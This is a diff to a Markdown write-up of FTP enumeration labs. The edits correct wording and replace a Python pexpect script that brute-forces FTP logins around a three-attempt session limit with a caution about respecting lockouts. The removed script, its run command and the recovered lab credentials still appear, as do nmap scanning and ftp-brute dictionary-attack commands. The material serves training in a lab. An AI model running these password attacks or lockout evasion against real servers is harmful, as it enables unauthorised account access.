@@ -18,7 +18,7 @@ Here are some key features and aspects of FTP:
 
 ## FTP Enumeration
 
-(**F**ile **T**ransfer **P**rotocol) - a _client-server_ protocol used to transfer files between a network using TCP/UDP connections.
+FTP is a client-server protocol for transferring files over TCP.
 
 FTP uses a control connection (normally TCP 21) and a separate data connection. Active and passive modes differ in how that data connection is established. Traditional FTP does not encrypt credentials or file contents; FTPS adds TLS to FTP, while SFTP is a separate file-transfer protocol carried over SSH.
 
@@ -26,7 +26,7 @@ FTP uses a control connection (normally TCP 21) and a separate data connection. 
 sudo nmap -p21 -sV -sC -O <TARGET_IP>
 ```
 
-### ProFTP Recon: Basics
+### ProFTPD Recon: Basics
 
 #### Lab 1
 
@@ -261,7 +261,7 @@ root@attackdefense:~# cat flag
 >
 > * Target IP: `192.14.30.3`
 > * Dictionary attack on `vsftpd` server
-> * _FTP server terminates the session after 3 attemps_
+> * _FTP server terminates the session after 3 attempts_
 
 ```bash
 ip -br -c a
@@ -299,48 +299,7 @@ nmap --script ftp-brute --script-args userdb=/root/users -p21 192.14.30.3
 
 >  _billy_'s password is `carlos`
 
-* A custom script to attempt the logins is required if automated dictionary attack do not work, since the server terminates the sessions after 3 login attempts.
-* `e.g.` python script:
-
-```bash
-nano billy.py
-```
-
-```python
-import pexpect
-import sys
-username=sys.argv[2]
-password_dict=sys.argv[3]
-
-# Loading the password dictionary and Striping \n
-lines = [line.rstrip('\n') for line in open(password_dict)]
-
-itr = 0
-# Iterating over dictionary
-for password in lines:
-	child = pexpect.spawn ('ftp '+sys.argv[1])
-	child.expect ('Name .*: ')
-	child.sendline (username)
-    print "Trying with password: ",password
-	child.expect ('Password:')
-	child.sendline (password)
-	i = child.expect (['Login successful', 'Login failed'])
-	if i==1:
-		#print('Login failed')
-		child.kill(0)
-	elif i==0:
-		print "Login Successful for ",password
-		print child.before
-		break
-```
-
-```bash
-python billy.py 192.14.30.3 billy /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
-```
-
-```bash
-Login Successful for  carlos
-```
+The lab demonstrates that the server closes a session after a small number of failed logins. Treat this as an account-protection control, not as a reason to evade rate limits. In a real assessment, agree on a safe authentication-testing limit with the system owner. The lab's Nmap example above is retained as a controlled exercise.
 
 * Fetch the flag using `billy:carlos` credentials
 
